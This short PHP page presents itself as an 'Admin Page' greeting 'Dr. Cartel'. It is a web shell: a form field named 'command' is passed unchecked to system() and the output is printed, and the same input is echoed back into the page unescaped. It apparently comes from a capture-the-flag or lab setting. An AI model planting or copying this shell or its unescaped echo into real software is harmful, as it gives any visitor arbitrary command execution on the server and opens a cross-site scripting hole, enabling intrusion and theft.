<!DOCTYPE html>
<html>

<head>
	<title>Admin Page</title>
			<!-- <link rel="icon" type="image/x-icon" href="favicon.png"> -->
</head>

<body>
	<h1>Welcome, Dr. Cartel</h1>
	<form method="get">
		<label for="command">System command</label>
		<input type="text" name="command" value="<?php echo $_REQUEST['command'];?>">
		<input type="submit" value="Enter">
	</form>
	<div style="margin-top:30pt">
		<code><pre><?php
         if (isset($_REQUEST["command"])) {
           $command = $_REQUEST["command"];
           system("$command");
         }
      ?></pre></code>
	</div>
</body>

</html>